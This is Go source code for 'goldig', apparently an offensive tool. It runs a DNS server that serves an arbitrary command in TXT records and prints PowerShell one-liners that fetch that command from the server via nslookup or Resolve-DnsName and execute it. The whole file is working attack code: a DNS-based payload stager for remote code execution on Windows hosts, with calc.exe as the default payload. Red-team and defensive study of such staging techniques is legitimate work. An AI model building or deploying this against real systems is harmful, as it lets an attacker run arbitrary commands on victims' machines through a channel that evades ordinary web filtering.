package main

import (
	"flag"
	"fmt"
	"net"
	"net/netip"
	"os"

	"github.com/phuslu/fastdns"
)

// fastdns struct for the server
type DNSHandler struct {
	command string
}

// DNS server function
func (handler *DNSHandler) ServeDNS(rw fastdns.ResponseWriter, req *fastdns.Message) {

	// ignore PTR for console output
	if fmt.Sprint(req.Question.Type) != "PTR" {
		fmt.Printf("Got %s request for %s", req.Question.Type, req.Domain)
	}

	// respond with a TXT record of the selected command
	switch req.Question.Type {
	case fastdns.TypeA:
		fastdns.HOST(rw, req, 60, []netip.Addr{netip.MustParseAddr("127.0.0.1")})
	case fastdns.TypeTXT:
		fastdns.TXT(rw, req, 60, handler.command)
	default:
		fastdns.Error(rw, req, fastdns.RcodeNXDomain)
	}
}

// returns the IPv4 addr of an interface specified by its name
// https://stackoverflow.com/a/51829730
func getIfaceAddr(ifaceName string) (ipAddr string, err error) {
	// get interface with that name
	iface, _ := net.InterfaceByName(ifaceName)
	addrs, _ := iface.Addrs()

	// for all addresses on that interface
	for _, addr := range addrs {
		// switch based on addr type
		switch v := addr.(type) {
		// if address type is IP
		case *net.IPNet:
			// if address is not loopback
			if !v.IP.IsLoopback() {
				// if address is IPv4
				if v.IP.To4() != nil {
					ipAddr = v.IP.String()
				}
			}
		}
	}

	// if interface has ip
	if ipAddr != "" {
		return ipAddr, nil
	} else {
		// if interface does not have ip
		return "", fmt.Errorf("interface %s does not exist or does not have an IPv4 address assigned", ifaceName)
	}
}

func main() {
	// args
	var flagIface string
	var flagCmd string
	flag.StringVar(&flagIface, "i", "eth0", "")
	flag.StringVar(&flagCmd, "c", "calc.exe", "")
	flag.Usage = func() {
		fmt.Print(`usage: goldig [OPTIONS]

Options:
    -i 	Interface to bind to (default: eth0)
    -c 	Command to serve (default: calc.exe)
    -h 	Shows this text

`)
	}
	flag.Parse()

	// get IP of the interface
	lhost, err := getIfaceAddr(flagIface)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	addr := lhost + ":53"
	fmt.Printf("Listening on %s\n", addr)

	// switch based on the length of the payload
	if len(flagCmd) > 255 {
		fmt.Printf("Use: powershell . ((resolve-dnsname -server %s -ty TXT example.com | select -expandproperty strings) -join \"\")", lhost)
		fmt.Printf("Enc: powershell -e ((resolve-dnsname -server %s -ty TXT example.com | select -expandproperty strings) -join \"\")", lhost)
	} else {
		fmt.Printf("Use: powershell . (nslookup -q=txt example.com %s)[-1]\n", lhost)
		fmt.Printf("Enc: powershell -e (nslookup -q=txt example.com %s)[-1]\n", lhost)
	}

	// create the server
	server := &fastdns.Server{
		Handler: &DNSHandler{
			command: flagCmd,
		},
		MaxProcs: 1,
	}

	// start server
	err = server.ListenAndServe(addr)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

}
